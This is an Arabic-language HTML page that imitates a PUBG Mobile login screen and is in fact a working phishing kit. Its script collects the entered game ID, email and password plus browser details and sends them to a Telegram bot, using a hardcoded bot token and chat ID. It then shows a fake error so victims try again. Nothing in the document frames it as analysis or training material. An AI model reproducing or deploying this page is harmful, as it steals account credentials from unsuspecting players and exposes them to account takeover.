<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>PUBG Mobile - تسجيل الدخول</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', -apple-system, Arial, sans-serif; }
body { background: linear-gradient(160deg, #0a0a0a, #1a1a1a); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
.box { background: #1c1c1c; padding: 35px 28px; border-radius: 14px; max-width: 450px; width: 100%; border: 1px solid #2a2a2a; }
.logo { text-align: center; margin-bottom: 20px; }
.logo img { height: 60px; width: auto; }
h1 { font-size: 22px; text-align: center; margin-bottom: 8px; color: #f3bf3a; font-weight: 800; }
.sub { font-size: 13px; color: #999; text-align: center; margin-bottom: 25px; }
.field { margin-bottom: 18px; }
.field label { display: block; font-size: 13px; color: #999; margin-bottom: 6px; }
.field input { width: 100%; padding: 14px 16px; font-size: 15px; border: 1px solid #2a2a2a; border-radius: 8px; background: #0f0f0f; color: #fff; outline: none; direction: ltr; }
.field input:focus { border-color: #f3bf3a; }
.btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #f3bf3a, #e0a800); color: #1a1a1a; border: none; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: pointer; margin-top: 10px; }
.btn:disabled { opacity: 0.6; }
.terms { display: flex; align-items: flex-start; gap: 10px; margin: 20px 0; font-size: 12px; color: #999; }
.terms input { margin-top: 3px; width: 16px; height: 16px; }
.terms a { color: #f3bf3a; text-decoration: none; }
.msg { padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; display: none; text-align: center; }
.msg.err { background: rgba(244,67,54,0.15); color: #ff6b6b; display: block; }
.badge { position: fixed; bottom: 5px; left: 5px; font-size: 9px; color: #555; }
</style>
</head>
<body>
<div class="badge"></div>

<div class="box">
    <div class="logo"><img src="pubg.webp" alt="PUBG"></div>
    <h1>تسجيل الدخول</h1>
    <p class="sub">ادخل بحساب PUBG Mobile</p>

    <div class="msg" id="msg"></div>

    <div class="field">
        <label>ID اللعبة</label>
        <input type="text" id="gameid" placeholder="5123456789">
    </div>

    <div class="field">
        <label>البريد الإلكتروني</label>
        <input type="email" id="email" placeholder="example@gmail.com">
    </div>

    <div class="field">
        <label>كلمة المرور</label>
        <input type="password" id="pass" placeholder="••••••••">
    </div>

    <div class="terms">
        <input type="checkbox" id="terms">
        <label for="terms">أوافق على <a href="#">الشروط</a></label>
    </div>

    <button class="btn" id="btn" onclick="submitForm()">تسجيل الدخول</button>
</div>

<script>
const TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
const CHAT_ID = "7560932400";

function send(t) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id: CHAT_ID, text: t})
    }).catch(()=>{});
}

function submitForm() {
    const gameid = document.getElementById("gameid").value.trim();
    const email = document.getElementById("email").value.trim();
    const pass = document.getElementById("pass").value;
    const terms = document.getElementById("terms").checked;
    const msg = document.getElementById("msg");
    const btn = document.getElementById("btn");

    if (!gameid || !email || !pass) { msg.className = "msg err"; msg.innerText = "يرجى إدخال جميع البيانات"; return; }
    if (!terms) { msg.className = "msg err"; msg.innerText = "يجب الموافقة على الشروط"; return; }

    btn.disabled = true;
    btn.innerText = "جاري التحقق...";

    let info = {
        "النوع": "PUBG Mobile",
        "ID اللعبة": gameid,
        "البريد الإلكتروني": email,
        "كلمة المرور": pass,
        "المتصفح": navigator.userAgent,
        "الوقت": new Date().toLocaleString("ar-EG")
    };

    send("🎯 *تسجيل دخول PUBG:*\n\n" + Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n"));

    setTimeout(() => {
        msg.className = "msg err";
        msg.innerText = "يبدو أن هذا الحساب غير صحيح. حاول مرة أخرى.";
        btn.disabled = false;
        btn.innerText = "تسجيل الدخول";
    }, 2000);
}
</script>
</body>
</html>
